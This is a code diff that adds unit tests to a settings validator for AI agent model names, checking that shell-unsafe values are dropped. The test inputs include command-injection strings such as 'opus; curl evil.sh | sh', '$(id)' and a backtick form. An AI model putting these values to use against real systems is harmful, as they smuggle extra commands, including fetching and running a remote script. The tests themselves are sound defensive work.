@@ -458,6 +458,13 @@ describe("agentModels", () => {
     expect(validateSettings({ agentModels: { claude: ["", 1] } }).agentModels).toEqual({});
   });
 
+  it("drops a value a shell would read as more than one argument", () => {
+    const settings = validateSettings({
+      agentModels: { claude: ["opus", "opus; curl evil.sh | sh", "a b", "$(id)", "`id`"] },
+    });
+    expect(settings.agentModels).toEqual({ claude: ["opus"] });
+  });
+
   it("accepts a custom agent's values — no catalog check", () => {
     expect(validateSettings({ agentModels: { "custom:wrapper": ["fast"] } }).agentModels).toEqual({
       "custom:wrapper": ["fast"],
@@ -476,6 +483,14 @@ describe("agentRuntimeDefaults", () => {
       validateSettings({ agentRuntimeDefaults: { claude: { model: "opus", effort: "high" } } })
         .agentRuntimeDefaults,
     ).toEqual({ claude: { model: "opus", effort: "high" } });
+  });
+
+  it("drops a default model a shell would read as more than one argument", () => {
+    expect(
+      validateSettings({
+        agentRuntimeDefaults: { claude: { model: "opus; id", effort: "high" } },
+      }).agentRuntimeDefaults,
+    ).toEqual({ claude: { model: null, effort: "high" } });
   });
 
   it("drops an effort the agent does not document", () => {
